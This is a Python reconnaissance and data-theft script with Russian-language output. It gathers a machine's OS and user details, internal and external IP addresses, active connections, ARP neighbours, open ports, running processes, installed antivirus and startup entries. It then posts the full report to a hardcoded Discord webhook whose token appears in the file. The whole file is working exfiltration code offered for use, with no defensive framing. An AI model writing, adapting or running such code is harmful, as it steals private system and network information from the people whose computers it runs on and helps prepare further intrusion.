import os
import subprocess
import requests
import socket
import psutil
import json
import time
import platform
import getpass
import re
import netifaces

WEBHOOK_URL = "https://discord.com/api/webhooks/1501580124427128913/OsesHzpcAB3VdyfccooN7qo_JJ3EqqL-i61nZ-odtBIIhevZ8d0JNfP9cc55BaQYn2Qr"

def send_to_discord(text):
    try:
        chunks = [text[i:i+1900] for i in range(0, len(text), 1900)]
        for chunk in chunks:
            requests.post(WEBHOOK_URL, json={"content": chunk}, timeout=10)
        return True
    except Exception as e:
        return False

def get_all_connections():
    connections = []
    try:
        for conn in psutil.net_connections(kind='inet'):
            if conn.raddr and conn.raddr.ip and conn.raddr.port:
                connections.append(f"🟢 ПРОЦЕСС: {conn.pid} | {conn.raddr.ip}:{conn.raddr.port}")
        return connections
    except:
        return ["Ошибка получения подключений"]

def get_active_users():
    users = []
    try:
        for user in psutil.users():
            users.append(f"👤 {user.name} | Хост: {user.host or 'локальный'} | Время: {time.ctime(user.started)}")
        return users
    except:
        return ["Ошибка получения пользователей"]

def get_network_info():
    info = []
    try:
        interfaces = netifaces.interfaces()
        for iface in interfaces:
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                for addr in addrs[netifaces.AF_INET]:
                    info.append(f"🌐 {iface}: {addr['addr']}")
    except:
        info = ["Ошибка получения сетевых интерфейсов"]
    
    try:
        hostname = socket.gethostname()
        ip_local = socket.gethostbyname(hostname)
        info.append(f"💻 Имя ПК: {hostname}")
        info.append(f"🏠 Локальный IP: {ip_local}")
        
        external_ip = requests.get('https://api.ipify.org', timeout=5).text
        info.append(f"🌍 Внешний IP: {external_ip}")
    except:
        info.append("Ошибка получения IP")
    
    return info

def get_running_apps():
    apps = []
    try:
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            try:
                apps.append(f"📱 {proc.info['name']} (PID: {proc.info['pid']}) | {proc.info['username']}")
            except:
                pass
        return apps[:50]
    except:
        return ["Ошибка получения процессов"]

def get_system_info():
    info = []
    info.append(f"🖥️ ОС: {platform.system()} {platform.release()}")
    info.append(f"⚙️ Архитектура: {platform.machine()}")
    info.append(f"👤 Текущий пользователь: {getpass.getuser()}")
    info.append(f"💿 Процессор: {platform.processor() or 'Неизвестно'}")
    
    try:
        memory = psutil.virtual_memory()
        info.append(f"🧠 ОЗУ: {memory.total // (1024**3)} ГБ (Доступно: {memory.available // (1024**3)} ГБ)")
        
        disk = psutil.disk_usage('/')
        info.append(f"💾 Диск C: {disk.total // (1024**3)} ГБ (Свободно: {disk.free // (1024**3)} ГБ)")
    except:
        pass
    
    return info

def get_autorun():
    autorun = []
    try:
        if platform.system() == "Windows":
            result = subprocess.run(['wmic', 'startup', 'get', 'command'], capture_output=True, text=True, timeout=10)
            autorun = result.stdout.split('\n')[1:10]
    except:
        autorun = ["Ошибка получения автозагрузки"]
    return [f"🚀 {x}" for x in autorun if x.strip()]

def get_installed_antivirus():
    antivirus = []
    try:
        if platform.system() == "Windows":
            result = subprocess.run(['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'AntiVirusProduct', 'get', 'displayName'], capture_output=True, text=True, timeout=10)
            antivirus = result.stdout.split('\n')[1:5]
    except:
        antivirus = ["Не удалось определить"]
    return [f"🛡️ {x}" for x in antivirus if x.strip()]

def get_open_ports():
    ports = []
    try:
        for conn in psutil.net_connections(kind='inet'):
            if conn.laddr and conn.laddr.port:
                ports.append(f"🔌 ПОРТ {conn.laddr.port} | Статус: {conn.status} | PID: {conn.pid}")
        return ports[:30]
    except:
        return ["Ошибка получения портов"]

def get_connected_devices():
    devices = []
    try:
        result = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=5)
        lines = result.stdout.split('\n')
        for line in lines:
            if 'dynamic' in line.lower() and '.' in line:
                parts = line.split()
                if len(parts) >= 2:
                    devices.append(f"📡 {parts[0]} -> {parts[1]}")
        return devices[:20]
    except:
        devices = ["Ошибка получения ARP таблицы"]
    return devices

def main():
    report = []
    report.append("🔥🔥🔥 ЖЕСТКИЙ СБОР ДАННЫХ 🔥🔥🔥")
    report.append("="*50)
    report.append(f"⏰ Время сбора: {time.ctime()}")
    report.append("="*50 + "\n")
    
    report.append("=== 🖥️ СИСТЕМНАЯ ИНФОРМАЦИЯ ===")
    report.extend(get_system_info())
    report.append("")
    
    report.append("=== 👥 АКТИВНЫЕ ПОЛЬЗОВАТЕЛИ ===")
    report.extend(get_active_users())
    report.append("")
    
    report.append("=== 🌐 СЕТЕВЫЕ ПОДКЛЮЧЕНИЯ (IP/ПОРТЫ) ===")
    report.extend(get_network_info())
    report.append("")
    
    report.append("=== 🔗 ТЕКУЩИЕ СЕТЕВЫЕ СОЕДИНЕНИЯ ===")
    connections = get_all_connections()
    report.extend(connections[:40])
    report.append("")
    
    report.append("=== 📡 ПОДКЛЮЧЕННЫЕ УСТРОЙСТВА В СЕТИ (ARP) ===")
    report.extend(get_connected_devices())
    report.append("")
    
    report.append("=== 🔌 ОТКРЫТЫЕ ПОРТЫ ===")
    report.extend(get_open_ports())
    report.append("")
    
    report.append("=== 📱 ЗАПУЩЕННЫЕ ПРОГРАММЫ (первые 40) ===")
    report.extend(get_running_apps()[:40])
    report.append("")
    
    report.append("=== 🛡️ УСТАНОВЛЕННЫЙ АНТИВИРУС ===")
    report.extend(get_installed_antivirus())
    report.append("")
    
    report.append("=== 🚀 АВТОЗАГРУЗКА (первые 10) ===")
    report.extend(get_autorun())
    report.append("")
    
    report.append("=== 🔥 ДОПОЛНИТЕЛЬНО ===")
    try:
        cpu_percent = psutil.cpu_percent(interval=1)
        report.append(f"⚡ Загрузка CPU: {cpu_percent}%")
    except:
        pass
    
    try:
        battery = psutil.sensors_battery()
        if battery:
            report.append(f"🔋 Батарея: {battery.percent}% {'(Заряжается)' if battery.power_plugged else '(Не заряжается)'}")
    except:
        pass
    
    report.append("\n" + "="*50)
    report.append("⚠️ ЭТОТ СКРИПТ СОБРАЛ ДАННЫЕ С ВАШЕГО ПК")
    report.append("="*50)
    
    final_text = "\n".join(report)
    
    print("Отправка данных в Discord...")
    if send_to_discord(final_text):
        print("✅ Данные отправлены!")
    else:
        print("❌ Ошибка отправки")
    
    print(f"\nСобрано информации: {len(final_text)} символов")

if __name__ == "__main__":
    try:
        import psutil
        import netifaces
    except ImportError:
        print("Устанавливаю необходимые библиотеки...")
        os.system('pip install psutil netifaces requests')
        import psutil
        import netifaces
    
    main()